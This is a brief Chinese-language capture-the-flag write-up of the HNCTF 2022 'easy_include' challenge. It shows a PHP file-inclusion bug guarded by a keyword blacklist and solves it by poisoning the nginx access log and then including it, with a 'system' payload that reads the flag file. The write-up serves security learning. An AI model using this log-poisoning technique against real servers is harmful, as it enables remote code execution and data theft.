# [HNCTF 2022 WEEK2]easy_include 文件包含遇上nginx

这道纯粹记录 完全没想到

```php
<?php
//WEB手要懂得搜索
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    if(preg_match("/php|flag|data|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\-|\_|\+|\=/i", $file)){
        die("error");
    }
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

存在文件包含漏洞过滤 data 等常见利用协议

然后我们看看能读取啥东西

发现啥都可以

那我们通过



<img src="https://i-blog.csdnimg.cn/blog_migrate/5a2ec5379851c0303c5554f52692726b.png" alt="" style="max-height:265px; box-sizing:content-box;" />


这里泄露了中间件

那么我们直接去搜



发现存在一个文件日志包含漏洞

```cobol
/var/log/nginx/access.log
```

看了看就是会解析php 所以直接传递参数即可传递一个phpinfo



<img src="https://i-blog.csdnimg.cn/blog_migrate/7b2db59a8fd47e37a07a993b97640040.png" alt="" style="max-height:533px; box-sizing:content-box;" />


成功执行 那么就直接开始吧 直接穿命令

```php
<?php system('cat /f*');?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/29c0fc17ea1cb2e1c2aa1a29393f8d48.png" alt="" style="max-height:156px; box-sizing:content-box;" />


得到flag

这个确实确实确实确实没想到 可以可以 又学到一个东西